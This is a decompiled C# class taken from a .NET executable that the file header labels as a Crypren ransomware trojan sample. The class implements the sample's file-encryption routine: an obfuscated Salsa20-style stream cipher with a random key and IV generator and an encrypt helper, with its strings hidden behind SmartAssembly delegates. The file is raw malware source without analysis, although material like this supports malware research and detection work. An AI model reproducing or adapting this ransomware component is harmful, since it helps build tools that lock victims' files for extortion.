// Decompiled with JetBrains decompiler
// Type: yedRdREuWKRqaRrYB.uSVNzpcBrR
// Assembly: Client-0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 0602F1A4-2566-46B4-A0A6-6E0F94D14C00
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Ransom.MSIL.Crypren.gen-899f48bad035165acf8869af63922619f8a901bbeb8a7fc13919ba90dd9e7768.exe

using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace yedRdREuWKRqaRrYB
{
  public sealed class uSVNzpcBrR : SymmetricAlgorithm
  {
    private int bMpvRHMCKprhyt;
    [NonSerialized]
    internal static GetString \u0019;

    public static byte[] YOpbVsOnwFaxe([In] byte[] obj0, [In] byte[] obj1, [In] byte[] obj2)
    {
      byte[] numArray1 = obj1;
      byte[] numArray2 = obj2;
      using (uSVNzpcBrR uSvNzpcBrR = new uSVNzpcBrR())
      {
        using (MemoryStream memoryStream = new MemoryStream())
        {
          uSvNzpcBrR.Key = numArray1;
          uSvNzpcBrR.IV = numArray2;
          using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, uSvNzpcBrR.CreateEncryptor(), CryptoStreamMode.Write))
          {
            byte[] buffer = obj0;
            cryptoStream.Write(buffer, 0, buffer.Length);
            cryptoStream.FlushFinalBlock();
          }
          return memoryStream.ToArray();
        }
      }
    }

    public uSVNzpcBrR()
    {
      this.LegalBlockSizesValue = new KeySizes[1]
      {
        new KeySizes(512, 512, 0)
      };
      this.LegalKeySizesValue = new KeySizes[1]
      {
        new KeySizes(128, 256, 128)
      };
      this.BlockSizeValue = 512;
      this.KeySizeValue = 256;
      this.bMpvRHMCKprhyt = 20;
    }

    [SpecialName]
    public override byte[] get_IV() => base.IV;

    [SpecialName]
    public override void set_IV([In] byte[] obj0)
    {
      uSVNzpcBrR.DjIvbAulavwr(obj0, uSVNzpcBrR.\u0019(107408164));
      this.IVValue = (byte[]) obj0.Clone();
    }

    public override ICryptoTransform CreateDecryptor([In] byte[] obj0, [In] byte[] obj1) => this.CreateEncryptor(obj0, obj1);

    public override ICryptoTransform CreateEncryptor([In] byte[] obj0, [In] byte[] obj1)
    {
      if (obj0 == null)
        throw new ArgumentNullException(uSVNzpcBrR.\u0019(107408155));
      if (!this.ValidKeySize(obj0.Length * 8))
        throw new CryptographicException(uSVNzpcBrR.\u0019(107408178));
      uSVNzpcBrR.DjIvbAulavwr(obj1, uSVNzpcBrR.\u0019(107408085));
      return (ICryptoTransform) new uSVNzpcBrR.KzkfHxWhrOg(obj0, obj1, this.bMpvRHMCKprhyt);
    }

    public override void GenerateIV() => this.IVValue = uSVNzpcBrR.ECURKIRxoM(8);

    public override void GenerateKey() => this.KeyValue = uSVNzpcBrR.ECURKIRxoM(this.KeySize / 8);

    private static void DjIvbAulavwr([In] byte[] obj0, [In] string obj1)
    {
      if (obj0 == null)
        throw new ArgumentNullException(obj1);
      if (obj0.Length != 8)
        throw new CryptographicException(uSVNzpcBrR.\u0019(107408108));
    }

    private static byte[] ECURKIRxoM([In] int obj0)
    {
      byte[] data = new byte[obj0];
      using (RandomNumberGenerator randomNumberGenerator = (RandomNumberGenerator) new RNGCryptoServiceProvider())
        randomNumberGenerator.GetBytes(data);
      return data;
    }

    static uSVNzpcBrR() => Strings.CreateGetStringDelegate(typeof (uSVNzpcBrR));

    private sealed class KzkfHxWhrOg : ICryptoTransform, IDisposable
    {
      private static readonly byte[] zIHfqLXwUqnbkOs;
      private static readonly byte[] eaDXRnEmllv;
      private readonly int bMpvRHMCKprhyt;
      private uint[] OlwObDhddlu;
      [NonSerialized]
      internal static GetString \u0007;

      public KzkfHxWhrOg([In] byte[] obj0, [In] byte[] obj1, [In] int obj2)
      {
        this.Initialize(obj0, obj1);
        this.bMpvRHMCKprhyt = obj2;
      }

      [SpecialName]
      public bool get_CanReuseTransform() => false;

      [SpecialName]
      public bool get_CanTransformMultipleBlocks() => true;

      [SpecialName]
      public int get_InputBlockSize() => 64;

      [SpecialName]
      public int get_OutputBlockSize() => 64;

      public int TransformBlock([In] byte[] obj0, [In] int obj1, [In] int obj2, [In] byte[] obj3, [In] int obj4)
      {
        if (obj0 == null)
          throw new ArgumentNullException(uSVNzpcBrR.KzkfHxWhrOg.\u0007(107408032));
        if (obj1 < 0 || obj1 >= obj0.Length)
          throw new ArgumentOutOfRangeException(uSVNzpcBrR.KzkfHxWhrOg.\u0007(107408047));
        if (obj2 < 0 || obj1 + obj2 > obj0.Length)
          throw new ArgumentOutOfRangeException(uSVNzpcBrR.KzkfHxWhrOg.\u0007(107408510));
        if (obj3 == null)
          throw new ArgumentNullException(uSVNzpcBrR.KzkfHxWhrOg.\u0007(107408525));
        if (obj4 < 0 || obj4 + obj2 > obj3.Length)
          throw new ArgumentOutOfRangeException(uSVNzpcBrR.KzkfHxWhrOg.\u0007(107408476));
        if (this.OlwObDhddlu == null)
          throw new ObjectDisposedException(this.GetType().Name);
        byte[] numArray = new byte[64];
        int num1 = 0;
        while (obj2 > 0)
        {
          this.Hash(numArray, this.OlwObDhddlu);
          this.OlwObDhddlu[8] = uSVNzpcBrR.KzkfHxWhrOg.AddOne(this.OlwObDhddlu[8]);
          if (this.OlwObDhddlu[8] == 0U)
            this.OlwObDhddlu[9] = uSVNzpcBrR.KzkfHxWhrOg.AddOne(this.OlwObDhddlu[9]);
          int num2 = Math.Min(64, obj2);
          for (int index = 0; index < num2; ++index)
            obj3[obj4 + index] = (byte) ((uint) obj0[obj1 + index] ^ (uint) numArray[index]);
          num1 += num2;
          obj2 -= 64;
          obj4 += 64;
          obj1 += 64;
        }
        return num1;
      }

      public byte[] TransformFinalBlock([In] byte[] obj0, [In] int obj1, [In] int obj2)
      {
        byte[] numArray = obj2 >= 0 ? new byte[obj2] : throw new ArgumentOutOfRangeException(uSVNzpcBrR.KzkfHxWhrOg.\u0007(107408510));
        this.TransformBlock(obj0, obj1, obj2, numArray, 0);
        return numArray;
      }

      public void Dispose()
      {
        if (this.OlwObDhddlu != null)
          Array.Clear((Array) this.OlwObDhddlu, 0, this.OlwObDhddlu.Length);
        this.OlwObDhddlu = (uint[]) null;
      }

      private static uint Rotate([In] uint obj0, [In] int obj1) => obj0 << obj1 | obj0 >> 32 - obj1;

      private static uint Add([In] uint obj0, [In] uint obj1) => obj0 + obj1;

      private static uint AddOne([In] uint obj0) => obj0 + 1U;

      private void Hash([In] byte[] obj0, [In] uint[] obj1)
      {
        uint[] numArray = (uint[]) obj1.Clone();
        for (int bMpvRhmcKprhyt = this.bMpvRHMCKprhyt; bMpvRhmcKprhyt > 0; bMpvRhmcKprhyt -= 2)
        {
          numArray[4] ^= uSVNzpcBrR.KzkfHxWhrOg.Rotate(uSVNzpcBrR.KzkfHxWhrOg.Add(numArray[0], numArray[12]), 7);
          numArray[8] ^= uSVNzpcBrR.KzkfHxWhrOg.Rotate(uSVNzpcBrR.KzkfHxWhrOg.Add(numArray[4], numArray[0]), 9);
          numArray[12] ^= uSVNzpcBrR.KzkfHxWhrOg.Rotate(uSVNzpcBrR.KzkfHxWhrOg.Add(numArray[8], numArray[4]), 13);
          numArray[0] ^= uSVNzpcBrR.KzkfHxWhrOg.Rotate(uSVNzpcBrR.KzkfHxWhrOg.Add(numArray[12], numArray[8]), 18);
          numArray[9] ^= uSVNzpcBrR.KzkfHxWhrOg.Rotate(uSVNzpcBrR.KzkfHxWhrOg.Add(numArray[5], numArray[1]), 7);
          numArray[13] ^= uSVNzpcBrR.KzkfHxWhrOg.Rotate(uSVNzpcBrR.KzkfHxWhrOg.Add(numArray[9], numArray[5]), 9);
          numArray[1] ^= uSVNzpcBrR.KzkfHxWhrOg.Rotate(uSVNzpcBrR.KzkfHxWhrOg.Add(numArray[13], numArray[9]), 13);
          numArray[5] ^= uSVNzpcBrR.KzkfHxWhrOg.Rotate(uSVNzpcBrR.KzkfHxWhrOg.Add(numArray[1], numArray[13]), 18);
          numArray[14] ^= uSVNzpcBrR.KzkfHxWhrOg.Rotate(uSVNzpcBrR.KzkfHxWhrOg.Add(numArray[10], numArray[6]), 7);
          numArray[2] ^= uSVNzpcBrR.KzkfHxWhrOg.Rotate(uSVNzpcBrR.KzkfHxWhrOg.Add(numArray[14], numArray[10]), 9);
          numArray[6] ^= uSVNzpcBrR.KzkfHxWhrOg.Rotate(uSVNzpcBrR.KzkfHxWhrOg.Add(numArray[2], numArray[14]), 13);
          numArray[10] ^= uSVNzpcBrR.KzkfHxWhrOg.Rotate(uSVNzpcBrR.KzkfHxWhrOg.Add(numArray[6], numArray[2]), 18);
          numArray[3] ^= uSVNzpcBrR.KzkfHxWhrOg.Rotate(uSVNzpcBrR.KzkfHxWhrOg.Add(numArray[15], numArray[11]), 7);
          numArray[7] ^= uSVNzpcBrR.KzkfHxWhrOg.Rotate(uSVNzpcBrR.KzkfHxWhrOg.Add(numArray[3], numArray[15]), 9);
          numArray[11] ^= uSVNzpcBrR.KzkfHxWhrOg.Rotate(uSVNzpcBrR.KzkfHxWhrOg.Add(numArray[7], numArray[3]), 13);
          numArray[15] ^= uSVNzpcBrR.KzkfHxWhrOg.Rotate(uSVNzpcBrR.KzkfHxWhrOg.Add(numArray[11], numArray[7]), 18);
          numArray[1] ^= uSVNzpcBrR.KzkfHxWhrOg.Rotate(uSVNzpcBrR.KzkfHxWhrOg.Add(numArray[0], numArray[3]), 7);
          numArray[2] ^= uSVNzpcBrR.KzkfHxWhrOg.Rotate(uSVNzpcBrR.KzkfHxWhrOg.Add(numArray[1], numArray[0]), 9);
          numArray[3] ^= uSVNzpcBrR.KzkfHxWhrOg.Rotate(uSVNzpcBrR.KzkfHxWhrOg.Add(numArray[2], numArray[1]), 13);
          numArray[0] ^= uSVNzpcBrR.KzkfHxWhrOg.Rotate(uSVNzpcBrR.KzkfHxWhrOg.Add(numArray[3], numArray[2]), 18);
          numArray[6] ^= uSVNzpcBrR.KzkfHxWhrOg.Rotate(uSVNzpcBrR.KzkfHxWhrOg.Add(numArray[5], numArray[4]), 7);
          numArray[7] ^= uSVNzpcBrR.KzkfHxWhrOg.Rotate(uSVNzpcBrR.KzkfHxWhrOg.Add(numArray[6], numArray[5]), 9);
          numArray[4] ^= uSVNzpcBrR.KzkfHxWhrOg.Rotate(uSVNzpcBrR.KzkfHxWhrOg.Add(numArray[7], numArray[6]), 13);
          numArray[5] ^= uSVNzpcBrR.KzkfHxWhrOg.Rotate(uSVNzpcBrR.KzkfHxWhrOg.Add(numArray[4], numArray[7]), 18);
          numArray[11] ^= uSVNzpcBrR.KzkfHxWhrOg.Rotate(uSVNzpcBrR.KzkfHxWhrOg.Add(numArray[10], numArray[9]), 7);
          numArray[8] ^= uSVNzpcBrR.KzkfHxWhrOg.Rotate(uSVNzpcBrR.KzkfHxWhrOg.Add(numArray[11], numArray[10]), 9);
          numArray[9] ^= uSVNzpcBrR.KzkfHxWhrOg.Rotate(uSVNzpcBrR.KzkfHxWhrOg.Add(numArray[8], numArray[11]), 13);
          numArray[10] ^= uSVNzpcBrR.KzkfHxWhrOg.Rotate(uSVNzpcBrR.KzkfHxWhrOg.Add(numArray[9], numArray[8]), 18);
          numArray[12] ^= uSVNzpcBrR.KzkfHxWhrOg.Rotate(uSVNzpcBrR.KzkfHxWhrOg.Add(numArray[15], numArray[14]), 7);
          numArray[13] ^= uSVNzpcBrR.KzkfHxWhrOg.Rotate(uSVNzpcBrR.KzkfHxWhrOg.Add(numArray[12], numArray[15]), 9);
          numArray[14] ^= uSVNzpcBrR.KzkfHxWhrOg.Rotate(uSVNzpcBrR.KzkfHxWhrOg.Add(numArray[13], numArray[12]), 13);
          numArray[15] ^= uSVNzpcBrR.KzkfHxWhrOg.Rotate(uSVNzpcBrR.KzkfHxWhrOg.Add(numArray[14], numArray[13]), 18);
        }
        for (int index = 0; index < 16; ++index)
          uSVNzpcBrR.KzkfHxWhrOg.ToBytes(uSVNzpcBrR.KzkfHxWhrOg.Add(numArray[index], obj1[index]), obj0, 4 * index);
      }

      private void Initialize([In] byte[] obj0, [In] byte[] obj1)
      {
        this.OlwObDhddlu = new uint[16];
        this.OlwObDhddlu[1] = uSVNzpcBrR.KzkfHxWhrOg.ToUInt32(obj0, 0);
        this.OlwObDhddlu[2] = uSVNzpcBrR.KzkfHxWhrOg.ToUInt32(obj0, 4);
        this.OlwObDhddlu[3] = uSVNzpcBrR.KzkfHxWhrOg.ToUInt32(obj0, 8);
        this.OlwObDhddlu[4] = uSVNzpcBrR.KzkfHxWhrOg.ToUInt32(obj0, 12);
        byte[] numArray = obj0.Length == 32 ? uSVNzpcBrR.KzkfHxWhrOg.zIHfqLXwUqnbkOs : uSVNzpcBrR.KzkfHxWhrOg.eaDXRnEmllv;
        int num = obj0.Length - 16;
        this.OlwObDhddlu[11] = uSVNzpcBrR.KzkfHxWhrOg.ToUInt32(obj0, num);
        this.OlwObDhddlu[12] = uSVNzpcBrR.KzkfHxWhrOg.ToUInt32(obj0, num + 4);
        this.OlwObDhddlu[13] = uSVNzpcBrR.KzkfHxWhrOg.ToUInt32(obj0, num + 8);
        this.OlwObDhddlu[14] = uSVNzpcBrR.KzkfHxWhrOg.ToUInt32(obj0, num + 12);
        this.OlwObDhddlu[0] = uSVNzpcBrR.KzkfHxWhrOg.ToUInt32(numArray, 0);
        this.OlwObDhddlu[5] = uSVNzpcBrR.KzkfHxWhrOg.ToUInt32(numArray, 4);
        this.OlwObDhddlu[10] = uSVNzpcBrR.KzkfHxWhrOg.ToUInt32(numArray, 8);
        this.OlwObDhddlu[15] = uSVNzpcBrR.KzkfHxWhrOg.ToUInt32(numArray, 12);
        this.OlwObDhddlu[6] = uSVNzpcBrR.KzkfHxWhrOg.ToUInt32(obj1, 0);
        this.OlwObDhddlu[7] = uSVNzpcBrR.KzkfHxWhrOg.ToUInt32(obj1, 4);
        this.OlwObDhddlu[8] = 0U;
        this.OlwObDhddlu[9] = 0U;
      }

      private static uint ToUInt32([In] byte[] obj0, [In] int obj1) => (uint) ((int) obj0[obj1] | (int) obj0[obj1 + 1] << 8 | (int) obj0[obj1 + 2] << 16 | (int) obj0[obj1 + 3] << 24);

      private static void ToBytes([In] uint obj0, [In] byte[] obj1, [In] int obj2)
      {
        obj1[obj2] = (byte) obj0;
        obj1[obj2 + 1] = (byte) (obj0 >> 8);
        obj1[obj2 + 2] = (byte) (obj0 >> 16);
        obj1[obj2 + 3] = (byte) (obj0 >> 24);
      }

      static KzkfHxWhrOg()
      {
        Strings.CreateGetStringDelegate(typeof (uSVNzpcBrR.KzkfHxWhrOg));
        uSVNzpcBrR.KzkfHxWhrOg.zIHfqLXwUqnbkOs = Encoding.ASCII.GetBytes(uSVNzpcBrR.KzkfHxWhrOg.\u0007(107408491));
        uSVNzpcBrR.KzkfHxWhrOg.eaDXRnEmllv = Encoding.ASCII.GetBytes(uSVNzpcBrR.KzkfHxWhrOg.\u0007(107408466));
      }
    }
  }
}
